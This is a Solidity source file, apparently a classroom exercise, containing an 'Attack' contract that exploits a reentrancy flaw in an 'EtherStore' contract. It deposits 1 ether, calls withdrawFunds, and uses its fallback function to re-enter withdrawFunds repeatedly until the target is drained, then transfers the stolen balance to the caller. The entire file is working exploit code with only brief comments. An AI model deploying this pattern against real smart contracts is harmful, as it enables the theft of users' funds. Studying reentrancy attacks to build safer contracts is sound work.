pragma solidity ^0.4.24;
import"./class46.sol";

contract Attack{

	EtherStore public etherStore;

	//intialisetheetherStorevariablewiththecontractaddress
	constructor(address _etherStoreAddress)public{
		etherStore = EtherStore(_etherStoreAddress);
	}

	function pwnEtherStore()public payable{
		//attacktothenearestether
		require(msg.value >= 1 ether);

		//sendethtothedepositFunds()function
		etherStore.depositFunds.value(1 ether)();

		//startthemagic
		etherStore.withdrawFunds(1 ether);
	}
	function collectEther()public{
		msg.sender.transfer(address(this).balance);
	}

	//fallbackfunction-wherethemagichappens
	function()payable public{
		if(address(etherStore).balance > 1 ether){
			etherStore.withdrawFunds(1 ether);
		}
	}
}